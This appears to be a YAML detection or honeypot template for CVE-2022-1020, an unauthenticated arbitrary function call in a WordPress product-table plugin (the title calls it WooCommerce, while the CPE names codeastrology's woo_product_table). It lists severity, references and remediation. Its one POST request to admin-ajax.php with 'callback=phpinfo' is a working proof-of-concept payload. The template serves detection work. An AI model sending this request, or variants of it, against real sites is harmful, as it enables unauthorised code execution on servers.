id: CVE-2022-1020
info:
  name: WordPress WooCommerce <3.1.2 - Arbitrary Function Call
  author: Akincibor
  description: WordPress WooCommerce plugin before 3.1.2 does not have authorisation
    and CSRF checks in the wpt_admin_update_notice_option AJAX action (available to
    both unauthenticated and authenticated users), as well as does not validate the
    callback parameter, allowing unauthenticated attackers to call arbitrary functions
    with either none or one user controlled argument.
  severity: critical
  impact: 'It allows remote code execution on the affected system.

    '
  remediation: 'Update WordPress WooCommerce plugin to version 3.1.2 or later to mitigate
    the vulnerability.

    '
  reference:
  - https://wpscan.com/vulnerability/04fe89b3-8ad1-482f-a96d-759d1d3a0dd5
  - https://nvd.nist.gov/vuln/detail/CVE-2022-1020
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-1020
    cwe-id: CWE-352
    epss-score: 0.01578
    epss-percentile: 0.8591
    cpe: cpe:2.3:a:codeastrology:woo_product_table:*:*:*:*:*:wordpress:*:*
  metadata:
    max-request: 1
    vendor: codeastrology
    product: woo_product_table
    framework: wordpress
  tags: cve,cve2022,wpscan,wp,wp-plugin,wordpress,unauth,codeastrology
traps:
- request:
    method: POST
    path: /wp-admin/admin-ajax.php?action=wpt_admin_update_notice_option
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'option_key=a&perpose=update&callback=phpinfo

      '
  response:
    status_code: 200
    headers: {}
    body: PHP ExtensionPHP Version
